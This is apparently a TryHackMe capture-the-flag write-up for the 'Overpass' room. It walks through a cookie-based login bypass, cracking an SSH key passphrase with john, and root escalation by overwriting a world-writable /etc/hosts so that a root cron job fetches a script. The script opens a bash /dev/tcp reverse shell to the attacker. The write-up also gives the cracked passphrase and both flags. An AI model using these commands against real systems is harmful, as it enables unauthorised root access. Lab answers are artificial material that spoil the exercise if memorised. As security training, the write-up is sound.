# 🛡️ TryHackMe – Overpass
Full Technical Walkthrough & Root Compromise Report

---

## 📌 Overview
Room Name: Overpass

Platform: TryHackMe

Difficulty: Easy

Category: Web / Authentication Bypass / Cryptography / Cron Job Exploitation

This assessment highlights a series of common security oversights, from weak web authentication to insecure file permissions and cron job manipulation. The attack chain involves:

• Broken Access Control (Cookie Manipulation)

• Sensitive Information Disclosure (RSA Key)

• SSH Key Passphrase Cracking

• DNS Poisoning via writable `/etc/hosts`

• Privilege Escalation via automated Cron Job

---

## 🔍 1. Enumeration Phase
The initial web scan and source code analysis of the login page revealed a flawed authentication logic.

Web Vulnerability The application checked for the presence of a specific cookie to grant access. By setting a `SessionToken` cookie with a value of `admin`, I successfully bypassed the login screen.

---

## 🔓 2. Initial Access
In the administrator area, an encrypted RSA private key was discovered.

SSH Key Cracking The key was encrypted using AES-128-CBC. I used `ssh2john` to extract the hash and `john` with the `rockyou.txt` wordlist to crack the passphrase.

```

ssh2john id_rsa > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash

# Result: james13

```

SSH Connection

```

chmod 600 id_rsa

ssh -i id_rsa james@<target_ip>

```

🎯 User Flag: `thm{65c1aaf000506e56996822c6281e6bf7}`

---

## 🚀 3. Privilege Escalation Discovery
Post-exploitation enumeration revealed a scheduled task running as root.

### Critical Finding (Crontab)

```

cat /etc/crontab

# Update builds from latest code

* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

```

The system downloads and executes a script from `overpass.thm` every minute as root.

Exploitation Vector I checked the permissions of `/etc/hosts` and found it was globally writable:

```

ls -l /etc/hosts

# Result: -rw-rw-rw- 

```

---

## 🛠️ 4. Exploitation (The DNS Poisoning Attack)
### Step 1: DNS Redirection

I modified `/etc/hosts` to point `overpass.thm` to my Kali Linux IP address:

```

echo "<kali_ip> overpass.thm" > /etc/hosts

```

### Step 2: Hosting the Malicious Script

On my Kali machine, I created the expected directory structure and a reverse shell script:

```

mkdir -p downloads/src

echo "bash -i >& /dev/tcp/<kali_ip>/4444 0>&1" > downloads/src/buildscript.sh

```

### Step 3: Web Server & Listener

Started a Python web server on port 80 to serve the script and a Netcat listener on port 4444:

```

python3 -m http.server 80

nc -lvnp 4444

```

---

## 🏁 5. Root Capture
After one minute, the root cron job executed the `curl` command, downloaded my script, and initiated a connection back to my listener.

```

# Connection received

id

# uid=0(root) gid=0(root) groups=0(root)

```

🎯 Root Flag: 'thm{7f336f8c359dbac18d54fdd64ea753bb}'

---

## 🧠 Key Takeaways
1. Broken Access Control: Relying solely on client-side cookies for authentication is insecure.

2. Insecure File Permissions: Critical system files like `/etc/hosts` must never be world-writable.

3. Implicit Trust in DNS: Using hostnames in root-level cron jobs without verifying the source creates a massive attack vector.

4. Credential Hygiene: Encrypting keys with weak passwords only provides a false sense of security.

---

✍️ Author:Akira Hasuo
